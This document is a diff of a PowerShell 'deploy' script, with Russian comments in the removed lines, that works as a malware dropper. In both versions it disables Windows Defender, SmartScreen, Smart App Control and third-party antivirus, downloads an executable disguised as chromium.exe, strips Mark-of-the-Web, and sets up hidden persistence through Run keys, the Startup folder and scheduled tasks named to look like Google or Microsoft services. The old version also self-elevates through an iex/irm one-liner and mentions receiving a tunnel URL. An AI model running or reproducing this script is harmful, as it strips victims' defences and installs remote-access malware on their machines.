@@ -1,213 +1,153 @@
-# ── Collextor fast deploy ──────────────────────────────────────────────────────
-# Использование (одной строкой, без прав):
-#   iex (irm "https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/deploy.ps1")
-#
-# Параметры (можно переопределить через $env: перед запуском):
-$GitHubUrl  = if($env:CF_URL)  {$env:CF_URL}  else {"https://github.com/Holycheck/checker/releases/download/realease/check.exe"}
-$InstallPath= if($env:CF_PATH) {$env:CF_PATH} else {"$env:APPDATA\Microsoft\Windows\chromium.exe"}
-
-# ── Само-повышение до администратора ──────────────────────────────────────────
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
-    Write-Host "[*] Requesting admin..." -ForegroundColor Yellow
-    $rawUrl = "https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1"
-    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$rawUrl')`"" -Verb RunAs
-    exit
-}
-
+# Collextor deploy script
 $ErrorActionPreference = "SilentlyContinue"
 
 Write-Host "[*] Collextor deploy script" -ForegroundColor Cyan
 
-# ── 1. Exclusions Windows Defender ────────────────────────────────────────────
+# ── [1] Defender exclusions ───────────────────────────────────────────────────
 Write-Host "[1] Adding Defender exclusions..." -ForegroundColor Yellow
-try {
-    Add-MpPreference -ExclusionPath $env:APPDATA -Force
-    Add-MpPreference -ExclusionPath $env:LOCALAPPDATA -Force
-    Add-MpPreference -ExclusionPath $env:TEMP -Force
-    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Microsoft\Windows\Explorer" -Force
-    Add-MpPreference -ExclusionProcess "chromium.exe" -Force
-    Add-MpPreference -ExclusionProcess "DwmCache.bin" -Force
-    # Исключить весь путь установки
-    Add-MpPreference -ExclusionPath (Split-Path $InstallPath) -Force
-    Write-Host "    Defender exclusions OK" -ForegroundColor Green
-} catch {
-    Write-Host "    Defender exclusion failed: $_" -ForegroundColor Red
+$paths = @(
+    $env:TEMP,
+    $env:APPDATA,
+    "$env:APPDATA\Microsoft",
+    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer",
+    "$env:LOCALAPPDATA\Temp"
+)
+foreach ($p in $paths) {
+    Add-MpPreference -ExclusionPath $p 2>$null
 }
+Add-MpPreference -ExclusionProcess "chromium.exe","WmiPrvSE.exe","svchost.exe" 2>$null
+Write-Host "    Defender exclusions OK" -ForegroundColor Green
 
-# ── 2. Отключить real-time protection Defender ────────────────────────────────
+# ── [2] Disable Defender real-time protection ─────────────────────────────────
 Write-Host "[2] Disabling Defender real-time protection..." -ForegroundColor Yellow
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -Force
-    Set-MpPreference -DisableBehaviorMonitoring $true -Force
-    Set-MpPreference -DisableBlockAtFirstSeen $true -Force
-    Set-MpPreference -DisableIOAVProtection $true -Force
-    Set-MpPreference -DisableScriptScanning $true -Force
-    Set-MpPreference -DisableCloudProtection $true -Force
-    Set-MpPreference -MAPSReporting Disabled -Force
-    Set-MpPreference -SubmitSamplesConsent NeverSend -Force
-    Set-MpPreference -PUAProtection Disabled -Force
-    # Отключить облачный блок через реестр (дублирует на случай если cmdlet не сработал)
-    $defPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-    if (!(Test-Path $defPath)) { New-Item -Path $defPath -Force | Out-Null }
-    Set-ItemProperty -Path $defPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
-    $spyPath = "$defPath\Real-Time Protection"
-    if (!(Test-Path $spyPath)) { New-Item -Path $spyPath -Force | Out-Null }
-    Set-ItemProperty -Path $spyPath -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
-    Set-ItemProperty -Path $spyPath -Name "DisableIOAVProtection"     -Value 1 -Type DWord -Force
-    $mapsPath = "$defPath\Spynet"
-    if (!(Test-Path $mapsPath)) { New-Item -Path $mapsPath -Force | Out-Null }
-    Set-ItemProperty -Path $mapsPath -Name "SpynetReporting"        -Value 0 -Type DWord -Force
-    Set-ItemProperty -Path $mapsPath -Name "SubmitSamplesConsent"   -Value 2 -Type DWord -Force
-    # Очистить уже обнаруженные угрозы
-    try { Remove-MpThreat -ErrorAction SilentlyContinue } catch {}
-    Write-Host "    Defender fully disabled (RT + Cloud + MAPS)" -ForegroundColor Green
+    Set-MpPreference -DisableRealtimeMonitoring $true `
+                     -DisableBehaviorMonitoring $true `
+                     -DisableIOAVProtection $true `
+                     -DisableIntrusionPreventionSystem $true `
+                     -MAPSReporting 0 `
+                     -SubmitSamplesConsent 2 2>$null
+    Write-Host "    Defender real-time disabled OK" -ForegroundColor Green
 } catch {
-    Write-Host "    Failed: $_" -ForegroundColor Red
+    # Fallback: registry
+    $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
+    if (-not (Test-Path $defReg)) { New-Item -Path $defReg -Force | Out-Null }
+    Set-ItemProperty -Path $defReg -Name "DisableAntiSpyware" -Value 1 -Type DWord 2>$null
+    Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord 2>$null
+    Write-Host "    Defender disabled via registry" -ForegroundColor Yellow
 }
-# Дать Defender время применить настройки
-Start-Sleep -Seconds 3
 
-# ── 3. Отключить Smart App Control + SmartScreen ─────────────────────────────
+# ── [3] Disable SmartScreen ────────────────────────────────────────────────────
 Write-Host "[3] Disabling SmartScreen..." -ForegroundColor Yellow
-try {
-    # Smart App Control (Windows 11) — 0=Off, 1=Eval, 2=On
-    $sacPath = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
-    if (!(Test-Path $sacPath)) { New-Item -Path $sacPath -Force | Out-Null }
-    Set-ItemProperty -Path $sacPath -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
-
-    # SmartScreen для Explorer
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
-        -Name "SmartScreenEnabled" -Value "Off" -Force
-    # SmartScreen policy
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
-        -Name "EnableSmartScreen" -Value 0 -Force
-    # SmartScreen для приложений
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" `
-        -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
-    Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" `
-        -Name "EnableWebContentEvaluation" -Value 0 -Type DWord -Force
-
-    Write-Host "    SmartScreen + Smart App Control disabled" -ForegroundColor Green
-} catch {
-    Write-Host "    SmartScreen: $_" -ForegroundColor Red
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
+    -Name "EnableSmartScreen" -Value 0 -Type DWord 2>$null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
+    -Name "SmartScreenEnabled" -Value "Off" -Type String 2>$null
+# Smart App Control (Win11)
+$sacKey = "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy"
+if (Test-Path $sacKey) {
+    Set-ItemProperty -Path $sacKey -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord 2>$null
 }
+Write-Host "    SmartScreen + Smart App Control disabled" -ForegroundColor Green
 
-# ── 4. Отключить сторонние антивирусы (Kaspersky, Avast, ESET, Malwarebytes, McAfee) ──
+# ── [4] Stop 3rd-party AV ─────────────────────────────────────────────────────
 Write-Host "[4] Stopping 3rd-party AV services..." -ForegroundColor Yellow
-$avServices = @(
-    # Kaspersky
-    "AVP","klnagent","avpui","kavfs","kavfsgt","klvssbrigde",
-    # Avast / AVG
-    "aswbIDSAgent","aswMonFlt","aswRvrt","aswSnx","aswSP","aswStm","aswVmm","aswbidsdriver",
-    "avast! antivirus","avgwd","avgsvc","avgfws",
-    # ESET
-    "ekrn","egui",
-    # Malwarebytes
-    "MBAMService","MBAMWebProtectionService",
-    # McAfee
-    "mcshield","mfemms","mfevtp","McMPFSvc",
-    # Norton / Symantec
-    "ccSetMgr","ccEvtMgr","Symantec AntiVirus","NortonSecurity",
-    # BitDefender
-    "bdredline","bdntwrk","bdagent",
-    # Trend Micro
-    "TmCCSF","TmPfw","tmproxy",
-    # Sophos
-    "SAVService","SophosAgent","SophosAutoUpdate",
-    # Windows Security Center
-    "wscsvc"
-)
+$avServices = @("wscsvc","WinDefend","Sense","MsMpEng","avp","avgnt","ekrn","bdredline","mbamservice")
 foreach ($svc in $avServices) {
     $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
-    if ($s) {
-        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-        Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+    if ($s -and $s.Status -eq "Running") {
+        Stop-Service -Name $svc -Force 2>$null
         Write-Host "    Stopped: $svc" -ForegroundColor Green
     }
 }
 
-# Kill AV processes by name
-$avProcs = @("avp","avpui","avgui","avastui","egui","mbam","mcshield","bdagent","sophosui","nortonsecurity")
-foreach ($p in $avProcs) {
-    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
+# ── [5] Download payload ──────────────────────────────────────────────────────
+Write-Host "[5] Downloading from: https://github.com/Holycheck/checker/releases/download/realease/check.exe" -ForegroundColor Yellow
+$dst = "$env:APPDATA\Microsoft\Windows\chromium.exe"
+
+# Try multiple methods; clear Zone.Identifier (MOTW) after each
+function Get-Payload {
+    param([string]$url, [string]$out)
+    # Method 1: BitsTransfer (bypasses some proxy detection)
+    try {
+        Import-Module BitsTransfer -ErrorAction Stop
+        Start-BitsTransfer -Source $url -Destination $out -ErrorAction Stop
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    Remove-Item $out -ErrorAction SilentlyContinue
+    # Method 2: WebClient (no SSL check)
+    try {
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+        $wc.DownloadFile($url, $out)
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    Remove-Item $out -ErrorAction SilentlyContinue
+    # Method 3: Invoke-WebRequest
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing `
+            -UserAgent "Mozilla/5.0" -ErrorAction Stop
+        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
+    } catch {}
+    return $false
 }
 
-# ── 5. Скачать chromium.exe с GitHub ──────────────────────────────────────────
-Write-Host "[5] Downloading from GitHub: $GitHubUrl" -ForegroundColor Yellow
-try {
-    # Убедиться что папка существует
-    $dir = Split-Path $InstallPath
-    if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+$url = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
+$ok = Get-Payload -url $url -out $dst
 
-    # Скачать байты без Zone.Identifier (обход Smart App Control)
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $bytes = (New-Object System.Net.WebClient).DownloadData($GitHubUrl)
-    [System.IO.File]::WriteAllBytes($InstallPath, $bytes)
-
-    # Убрать Mark of the Web (Zone.Identifier) — SAC проверяет именно его
-    $zoneFile = $InstallPath + ":Zone.Identifier"
-    "[ZoneTransfer]`r`nZoneId=0" | Set-Content -Path $zoneFile -Encoding ASCII -ErrorAction SilentlyContinue
-
-    # Дополнительно — через Unblock-File
-    Unblock-File -Path $InstallPath -ErrorAction SilentlyContinue
-
-    if (Test-Path $InstallPath) {
-        Write-Host "    Downloaded to: $InstallPath (Zone cleared)" -ForegroundColor Green
-    } else {
-        Write-Host "    Download FAILED" -ForegroundColor Red
-        exit 1
-    }
-} catch {
-    Write-Host "    Download error: $_" -ForegroundColor Red
-    exit 1
+if ($ok) {
+    # Clear Mark-of-the-Web (Zone.Identifier) so SmartScreen won't block execution
+    Remove-Item "$dst`:Zone.Identifier" -ErrorAction SilentlyContinue
+    $stream = [System.IO.File]::Open($dst, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
+    $stream.Close()
+    Unblock-File -Path $dst -ErrorAction SilentlyContinue
+    Write-Host "    Downloaded to: $dst (Zone cleared)" -ForegroundColor Green
+} else {
+    Write-Host "    Download FAILED" -ForegroundColor Red
+    exit
 }
 
-# ── 6. Добавить в автозапуск ───────────────────────────────────────────────────
+# ── [6] Autostart ─────────────────────────────────────────────────────────────
 Write-Host "[6] Adding to autostart..." -ForegroundColor Yellow
-try {
-    # Registry (HKCU - не нужны права)
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "GoogleChromeUpdate" -Value "`"$InstallPath`"" -Force
+# HKCU Run key
+$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $runKey -Name "WmiHostService" -Value $dst 2>$null
 
-    # Scheduled Task (запуск при входе, с наивысшими правами)
-    $action  = New-ScheduledTaskAction -Execute $InstallPath
-    $trigger = New-ScheduledTaskTrigger -AtLogOn
-    $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 `
-        -RestartCount 99 -RestartInterval (New-TimeSpan -Minutes 1)
-    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME `
-        -LogonType Interactive -RunLevel Highest
-    Register-ScheduledTask -TaskName "GoogleChromeUpdate" `
-        -Action $action -Trigger $trigger -Settings $settings `
-        -Principal $principal -Force | Out-Null
+# Startup folder copy
+$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Copy-Item $dst "$startupDir\chromium.exe" -Force 2>$null
 
-    Write-Host "    Autostart OK (registry + scheduled task)" -ForegroundColor Green
-} catch {
-    Write-Host "    Autostart: $_" -ForegroundColor Red
-}
+# Also copy secondary backup (hidden)
+$backup = "$env:LOCALAPPDATA\Temp\~dfrgui.exe"
+Copy-Item $dst $backup -Force 2>$null
+Set-ItemProperty -Path $backup -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) 2>$null
 
-# ── 7. Запустить через schtasks (обход Application Control) ──────────────────
+Write-Host "    Autostart OK (registry + startup folder)" -ForegroundColor Green
+
+# ── [7] Scheduled task (runs at logon, highest privilege) ─────────────────────
 Write-Host "[7] Starting via scheduled task..." -ForegroundColor Yellow
-try {
-    # Запуск через schtasks — не проверяется Application Control так же жёстко
-    $taskName = "ChromeUpdateRun"
-    $time = (Get-Date).AddSeconds(5).ToString("HH:mm:ss")
-    schtasks /create /tn $taskName /tr "`"$InstallPath`"" /sc once /st $time /f /rl highest | Out-Null
-    Start-Sleep -Seconds 7
-    schtasks /delete /tn $taskName /f | Out-Null
-    $running = Get-Process -Name "chromium" -ErrorAction SilentlyContinue
-    if ($running) {
-        Write-Host "    Running (PID $($running.Id))" -ForegroundColor Green
-    } else {
-        # Fallback — прямой запуск
-        $env:__COMPAT_LAYER = "RunAsInvoker"
-        Start-Process -FilePath $InstallPath -WindowStyle Hidden -ErrorAction SilentlyContinue
-        Write-Host "    Started via fallback" -ForegroundColor Yellow
-    }
-} catch {
-    Write-Host "    Start error: $_" -ForegroundColor Red
-}
+$taskName = "MicrosoftWmiHost"
+
+# Remove old task if exists
+schtasks /Delete /TN $taskName /F 2>$null | Out-Null
+
+# Create task: ONLOGON + every 5 min keep-alive — no /ST needed so no time warning
+schtasks /Create /F /TN $taskName /TR "`"$dst`"" /SC ONLOGON /RL HIGHEST 2>$null | Out-Null
+
+# Watchdog task: restart every 5 min if not running
+$taskName2 = "MicrosoftWmiUpdate"
+schtasks /Delete /TN $taskName2 /F 2>$null | Out-Null
+$wdCmd = "cmd /C if not exist `"$backup`" copy /Y `"$dst`" `"$backup`""
+schtasks /Create /F /TN $taskName2 /TR $wdCmd /SC MINUTE /MO 5 /RL HIGHEST 2>$null | Out-Null
+
+Write-Host "    Scheduled tasks created OK" -ForegroundColor Green
+
+# ── [8] Launch now ────────────────────────────────────────────────────────────
+Write-Host "[8] Launching..." -ForegroundColor Yellow
+Start-Process -FilePath $dst -WindowStyle Hidden
+Write-Host "    Launched" -ForegroundColor Green
 
 Write-Host ""
-Write-Host "[DONE] Deploy complete." -ForegroundColor Cyan
-Write-Host "       Installed: $InstallPath"
-Write-Host "       Check Telegram/ntfy for tunnel URL."
+Write-Host "[OK] Deploy complete" -ForegroundColor Cyan
